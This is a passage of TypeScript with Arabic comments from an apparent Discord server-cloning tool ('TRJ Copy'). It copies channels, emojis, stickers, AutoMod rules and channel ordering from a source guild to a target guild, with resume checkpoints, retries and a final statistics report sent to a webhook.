        const totalChannels = allOthers.length;
        const pendingChannels = allOthers.filter((c: any) => !channelMap[c.id]).length;
        let createdCount = 0;

        if (pendingChannels > 0) {
          send({ type: 'progress', message: `📺 جاري إنشاء ${pendingChannels} قناة${resumeMode ? ' (المتبقية)' : ''}...` });
        }
        // ✅ استكمال: رومات موجودة بالهدف (نوع+اسم) — فجوة ما بعد آخر نقطة حفظ
        const tgtChKeyMap = new Map<string, string>();
        if (resumeMode) {
          const tChPre = await df('GET', `/guilds/${targetId}/channels`);
          if (tChPre.ok && Array.isArray(tChPre.data)) {
            for (const tc of tChPre.data) {
              const k = `${tc.type}:${tc.name}`;
              if (!tgtChKeyMap.has(k)) tgtChKeyMap.set(k, tc.id);
            }
          }
        }
        const usedTgtChIds = new Set<string>(Object.values(channelMap));
        if (totalChannels > 0) {
          // إنشاء رومات كل كاتيجوري بالترتيب
          for (const cat of categories) {
            const catChannels = channelsByParent[cat.id] || [];
            for (const c of catChannels) {
              if (channelMap[c.id]) continue; // ✅ استكمال: منسوخة مسبقًا
              const existChId = tgtChKeyMap.get(`${c.type}:${c.name}`);
              if (existChId && !usedTgtChIds.has(existChId)) {
                channelMap[c.id] = existChId;
                usedTgtChIds.add(existChId);
                incrementChannelStats(c, stats);
                sendCheckpoint();
                continue;
              }
              const payload = buildChannelPayload(c, catMap, roleMap, sourceId, targetId);

              const res = await df('POST', `/guilds/${targetId}/channels`, payload);
              if (res.ok && res.data?.id) {
                channelMap[c.id] = res.data.id;
                incrementChannelStats(c, stats);
                stats.permissions += payload.permission_overwrites?.length || 0;
                sendCheckpoint();
              } else {
                stats.errors++;
                failedChannels.push({ channel: c, isCat: false });
              }

              createdCount++;
              send({ type: 'progress', message: `${getChannelEmoji(c.type)} ${createdCount}/${pendingChannels}: ${c.name}` });
              await delay(500); // ✅ 500ms — كان 350
            }
          }

          // إنشاء القنوات اليتيمة
          for (const c of orphanChannels) {
            if (channelMap[c.id]) continue; // ✅ استكمال: منسوخة مسبقًا
            const existChId2 = tgtChKeyMap.get(`${c.type}:${c.name}`);
            if (existChId2 && !usedTgtChIds.has(existChId2)) {
              channelMap[c.id] = existChId2;
              usedTgtChIds.add(existChId2);
              incrementChannelStats(c, stats);
              sendCheckpoint();
              continue;
            }
            const payload = buildChannelPayload(c, catMap, roleMap, sourceId, targetId);

            const res = await df('POST', `/guilds/${targetId}/channels`, payload);
            if (res.ok && res.data?.id) {
              channelMap[c.id] = res.data.id;
              incrementChannelStats(c, stats);
              stats.permissions += payload.permission_overwrites?.length || 0;
              sendCheckpoint();
            } else {
              stats.errors++;
              failedChannels.push({ channel: c, isCat: false });
            }

            createdCount++;
            send({ type: 'progress', message: `${getChannelEmoji(c.type)} ${createdCount}/${pendingChannels}: ${c.name}` });
            await delay(500);
          }

          // ✅ إعادة محاولة القنوات الفاشلة مرة واحدة
          if (failedChannels.length > 0 && failedChannels.some(f => !f.isCat)) {
            const failedRooms = failedChannels.filter(f => !f.isCat);
            send({ type: 'progress', message: `🔄 إعادة محاولة ${failedRooms.length} قناة فاشلة...` });
            for (const item of failedRooms) {
              await delay(1500);
              const payload = buildChannelPayload(item.channel, catMap, roleMap, sourceId, targetId);
              const res = await df('POST', `/guilds/${targetId}/channels`, payload);
              if (res.ok && res.data?.id) {
                channelMap[item.channel.id] = res.data.id;
                incrementChannelStats(item.channel, stats);
                stats.permissions += payload.permission_overwrites?.length || 0;
                stats.errors--;
                sendCheckpoint();
              }
            }
          }

          done.channels = true;
          sendCheckpoint();
          send({ type: 'stats', stats });
        }

        // ═══════════════════════════════════════════════════════════
        // المرحلة 7: تعيين قنوات النظام و AFK
        // ═══════════════════════════════════════════════════════════
        if (options?.settings !== false && !done.sysChannels) {
          const guildPatch: any = {};
          if (sourceSystemChannelId && channelMap[sourceSystemChannelId]) guildPatch.system_channel_id = channelMap[sourceSystemChannelId];
          if (sourceRulesChannelId && channelMap[sourceRulesChannelId]) guildPatch.rules_channel_id = channelMap[sourceRulesChannelId];
          if (sourcePublicUpdatesChannelId && channelMap[sourcePublicUpdatesChannelId]) guildPatch.public_updates_channel_id = channelMap[sourcePublicUpdatesChannelId];
          if (sourceAfkChannelId && channelMap[sourceAfkChannelId]) guildPatch.afk_channel_id = channelMap[sourceAfkChannelId];
          if (Object.keys(guildPatch).length > 0) {
            await df('PATCH', `/guilds/${targetId}`, guildPatch);
            send({ type: 'progress', message: '🔗 تم ربط قنوات النظام' });
          }
          done.sysChannels = true;
          sendCheckpoint();
        }

        // ═══════════════════════════════════════════════════════════
        // المرحلة 8: ترتيب القنوات
        // ═══════════════════════════════════════════════════════════
        if (!done.ordering) {
        const allNewCh = await df('GET', `/guilds/${targetId}/channels`);
        if (allNewCh.ok && Array.isArray(allNewCh.data)) {
          // ترتيب الكاتيجوريات
          const targetCats = allNewCh.data.filter((c: any) => c.type === 4);
          if (targetCats.length > 1) {
            const catPositions = targetCats.map((c: any) => {
              const srcId = Object.entries(catMap).find(([, v]) => v === c.id)?.[0];
              const srcCat = srcId ? categories.find((sc: any) => sc.id === srcId) : null;
              return { id: c.id, position: srcCat ? srcCat.position : 0 };
            });
            catPositions.sort((a: any, b: any) => a.position - b.position);
            await df('PATCH', `/guilds/${targetId}/channels`, catPositions.map((item: any, idx: number) => ({ id: item.id, position: idx })));
            await delay(400);
          }

          // ترتيب القنوات داخل كل كاتيجوري
          const targetByParent: Record<string, any[]> = {};
          const targetOrphans: any[] = [];
          for (const c of allNewCh.data.filter((c: any) => c.type !== 4)) {
            if (c.parent_id) { if (!targetByParent[c.parent_id]) targetByParent[c.parent_id] = []; targetByParent[c.parent_id].push(c); }
            else targetOrphans.push(c);
          }
          for (const [parentId, channels] of Object.entries(targetByParent)) {
            if (channels.length <= 1) continue;
            const srcCatId = Object.entries(catMap).find(([, v]) => v === parentId)?.[0];
            if (!srcCatId) continue;
            const srcCatChannels = channelsByParent[srcCatId] || [];
            const positions = channels.map((c: any) => {
              const srcId = Object.entries(channelMap).find(([, v]) => v === c.id)?.[0];
              const srcCh = srcId ? srcCatChannels.find((sc: any) => sc.id === srcId) : null;
              return { id: c.id, position: srcCh ? srcCh.position : 0 };
            });
            positions.sort((a: any, b: any) => a.position - b.position);
            await df('PATCH', `/guilds/${targetId}/channels`, positions.map((item: any, idx: number) => ({ id: item.id, position: idx })));
            await delay(400);
          }
        }
        done.ordering = true;
        sendCheckpoint();
        }
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 9: نسخ الإيموجي
      // ═══════════════════════════════════════════════════════════════
      if (sEmojis.length > 0) {
        const pendingEmojis = sEmojis.filter((e: any) => !emojiMap[e.id]);
        if (pendingEmojis.length > 0) {
        send({ type: 'progress', message: `😀 جاري نسخ ${pendingEmojis.length} إيموجي${resumeMode ? ' (المتبقية)' : ''}...` });
        // ✅ استكمال: إيموجي موجود بالهدف بالاسم — فجوة ما بعد آخر نقطة حفظ
        const tgtEmojiNameMap = new Map<string, string>();
        if (resumeMode) {
          const tEmPre = await df('GET', `/guilds/${targetId}/emojis`);
          if (tEmPre.ok && Array.isArray(tEmPre.data)) {
            for (const te of tEmPre.data) if (!tgtEmojiNameMap.has(te.name)) tgtEmojiNameMap.set(te.name, te.id);
          }
        }
        for (let i = 0; i < sEmojis.length; i++) {
          const emoji = sEmojis[i];
          if (emojiMap[emoji.id]) continue; // ✅ استكمال: منسوخ مسبقًا
          const existEmId = tgtEmojiNameMap.get(emoji.name);
          if (existEmId && !Object.values(emojiMap).includes(existEmId)) {
            emojiMap[emoji.id] = existEmId;
            stats.emojis++;
            send({ type: 'progress', message: `😀 موجود مسبقًا: ${emoji.name}` });
            sendCheckpoint();
            continue;
          }
          try {
            const imageUrl = emoji.animated
              ? `https://cdn.discordapp.com/emojis/${emoji.id}.gif`
              : `https://cdn.discordapp.com/emojis/${emoji.id}.png`;
            const dataUri = await downloadAsDataURI(imageUrl, emoji.animated ? 'image/gif' : 'image/png');
            if (!dataUri) { stats.errors++; continue; }
            const emojiRoles: string[] = [];
            if (emoji.roles && Array.isArray(emoji.roles)) {
              for (const rid of emoji.roles) { if (roleMap[rid]) emojiRoles.push(roleMap[rid]); }
            }
            const res = await df('POST', `/guilds/${targetId}/emojis`, { name: emoji.name, image: dataUri, roles: emojiRoles });
            if (res.ok && res.data?.id) { stats.emojis++; emojiMap[emoji.id] = res.data.id; sendCheckpoint(); }
            else stats.errors++;
          } catch { stats.errors++; }
          send({ type: 'progress', message: `😀 ${stats.emojis}/${sEmojis.length}: ${emoji.name}` });
          await delay(600);
        }
        send({ type: 'stats', stats });
        }
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 10: تحديث إيموجي الفورم
      // ═══════════════════════════════════════════════════════════════
      if (!done.forumEmoji && Object.keys(emojiMap).length > 0 && Object.keys(channelMap).length > 0) {
        for (const [srcChId, tgtChId] of Object.entries(channelMap)) {
          const srcCh = sChannels.find((c: any) => c.id === srcChId);
          if (!srcCh || (srcCh.type !== 15 && srcCh.type !== 16)) continue;
          if (srcCh.default_reaction_emoji?.emoji_id && emojiMap[srcCh.default_reaction_emoji.emoji_id]) {
            await df('PATCH', `/channels/${tgtChId}`, { default_reaction_emoji: { emoji_id: emojiMap[srcCh.default_reaction_emoji.emoji_id] } });
            await delay(300);
          }
        }
        done.forumEmoji = true;
        sendCheckpoint();
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 11: نسخ الستيكرز
      // ═══════════════════════════════════════════════════════════════
      if (sStickers.length > 0) {
        send({ type: 'progress', message: `🎨 جاري نسخ ${sStickers.length} ستكر...` });
        // ✅ استكمال: ستكرز موجودة بالهدف بالاسم — فجوة ما بعد آخر نقطة حفظ
        const tgtStickerNames = new Set<string>();
        if (resumeMode) {
          const tStPre = await df('GET', `/guilds/${targetId}/stickers`);
          if (tStPre.ok && Array.isArray(tStPre.data)) for (const ts of tStPre.data) tgtStickerNames.add(ts.name);
        }
        for (let i = 0; i < sStickers.length; i++) {
          const sticker = sStickers[i];
          if (stickerIds.includes(sticker.id)) continue; // ✅ استكمال: منسوخ مسبقًا
          if (tgtStickerNames.has(sticker.name)) { stickerIds.push(sticker.id); continue; }
          if (sticker.format_type === 3) { stats.errors++; continue; }
          try {
            let ext = 'png', mime = 'image/png';
            if (sticker.format_type === 2) { ext = 'gif'; mime = 'image/gif'; }
            else if (sticker.format_type === 4) { ext = 'webp'; mime = 'image/webp'; }
            const imgRes = await fetch(`https://cdn.discordapp.com/stickers/${sticker.id}.${ext}`, { signal: AbortSignal.timeout(20000) });
            if (imgRes.ok) {
              const buf = await imgRes.arrayBuffer();
              const fd = new FormData();
              fd.append('name', sticker.name);
              fd.append('description', sticker.description || '');
              fd.append('tags', sticker.tags || '');
              fd.append('file', new File([buf], `${sticker.name}.${ext}`, { type: mime }));
              const res = await dFetchFormData(auth, `${DISCORD_API}/guilds/${targetId}/stickers`, fd);
              if (res.ok) { stats.stickers++; stickerIds.push(sticker.id); sendCheckpoint(); } else stats.errors++;
            } else { stats.errors++; }
          } catch { stats.errors++; }
          send({ type: 'progress', message: `🎨 ${stats.stickers}/${sStickers.length}: ${sticker.name}` });
          await delay(700);
        }
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 12: نسخ أوتو مود
      // ═══════════════════════════════════════════════════════════════
      if (sAutoMod.length > 0) {
        const pendingAutoMod = sAutoMod.filter((r: any) => !automodIds.includes(r.id));
        if (pendingAutoMod.length > 0) {
        send({ type: 'progress', message: `🤖 جاري نسخ ${pendingAutoMod.length} قاعدة أوتو مود${resumeMode ? ' (المتبقية)' : ''}...` });
        }
        // ✅ استكمال: قواعد موجودة بالهدف بالاسم — فجوة ما بعد آخر نقطة حفظ
        const tgtAutoModNames = new Set<string>();
        if (resumeMode) {
          const tAmPre = await df('GET', `/guilds/${targetId}/auto-moderation/rules`);
          if (tAmPre.ok && Array.isArray(tAmPre.data)) for (const ta of tAmPre.data) tgtAutoModNames.add(ta.name);
        }
        for (const rule of sAutoMod) {
          if (automodIds.includes(rule.id)) continue; // ✅ استكمال: منسوخة مسبقًا
          if (tgtAutoModNames.has(rule.name)) { automodIds.push(rule.id); continue; }
          try {
            const actions = (rule.actions || []).map((a: any) => {
              const action: any = { type: a.type };
              if (a.metadata && Object.keys(a.metadata).length > 0) {
                action.metadata = { ...a.metadata };
                if (action.metadata.channel_id && channelMap[action.metadata.channel_id]) action.metadata.channel_id = channelMap[action.metadata.channel_id];
                else if (action.metadata.channel_id) delete action.metadata.channel_id;
                if (action.metadata.role_id && roleMap[action.metadata.role_id]) action.metadata.role_id = roleMap[action.metadata.role_id];
                else if (action.metadata.role_id) delete action.metadata.role_id;
              }
              return action;
            });
            const exemptRoles = (rule.exempt_roles || []).map((rid: string) => roleMap[rid]).filter(Boolean);
            const exemptChannels = (rule.exempt_channels || []).map((cid: string) => channelMap[cid]).filter(Boolean);
            const res = await df('POST', `/guilds/${targetId}/auto-moderation/rules`, {
              name: rule.name, enabled: rule.enabled !== false, event_type: rule.event_type,
              trigger_type: rule.trigger_type, trigger_metadata: rule.trigger_metadata || {},
              actions, exempt_roles: exemptRoles, exempt_channels: exemptChannels,
            });
            if (res.ok) { stats.autoMod++; automodIds.push(rule.id); sendCheckpoint(); } else stats.errors++;
          } catch { stats.errors++; }
          await delay(500);
        }
      }

      // ═══════════════════════════════════════════════════════════════
      // النتيجة النهائية
      // ═══════════════════════════════════════════════════════════════
      sendToWebhook({
        username: 'TRJ Copy',
        embeds: [{
          title: '✅ Copy Completed',
          color: 0x00ff41,
          fields: [
            { name: '🎭 Roles', value: String(stats.roles), inline: true },
            { name: '📁 Cats', value: String(stats.cats), inline: true },
            { name: '💬 Text', value: String(stats.txt), inline: true },
            { name: '🔊 Voice', value: String(stats.voice), inline: true },
            { name: '💬 Forums', value: String(stats.forums), inline: true },
            { name: '😀 Emojis', value: String(stats.emojis), inline: true },
            { name: '🎨 Stickers', value: String(stats.stickers), inline: true },
            { name: '🤖 AutoMod', value: String(stats.autoMod), inline: true },
            { name: '🔐 Perms', value: String(stats.permissions), inline: true },
            { name: '🖼️ Icon', value: stats.icon ? '✅' : '❌', inline: true },
            { name: '🌈 Banner', value: stats.banner ? '✅' : '❌', inline: true },
            { name: '❌ Errors', value: String(stats.errors), inline: true },
          ],
          timestamp: new Date().toISOString(),
        }],
      }, whUrl).catch(() => {});

      sendCheckpoint();
      const roleLine = stats.rolesTotal > 0 ? `الرتب ${stats.roles}/${stats.rolesTotal}` : `${stats.roles} رتب`;
      const summary = [
        `✅ تم النسخ!`,
        `${roleLine} | ${stats.cats} كاتيجوري | ${stats.txt} كتابي | ${stats.voice} صوتي | ${stats.forums} فورم`,
        `${stats.emojis} إيموجي | ${stats.stickers} ستكر | ${stats.autoMod} أوتو مود | ${stats.permissions} صلاحية`,
        stats.icon ? '🖼️ أيقونة' : '', stats.banner ? '🌈 بانر' : '', stats.splash ? '💦 سبلش' : '',
        stats.partialRoles > 0 ? `⚠️ ${stats.partialRoles} رتبة بدون صلاحيات كاملة (التوكن ما يقدر يمنحها)` : '',
        roleErrSample.length > 0 ? `⚠️ سبب فشل الرتب: ${roleErrSample[0]}` : '',
        `${stats.errors} أخطاء`,
      ].filter(Boolean).join(' | ');

      send({ type: 'done', success: true, stats, message: summary });
    });
  } catch (e: unknown) {
    const msg = e instanceof Error ? e.message : 'خطأ غير متوقع';
    return errRes(msg);
  }
}
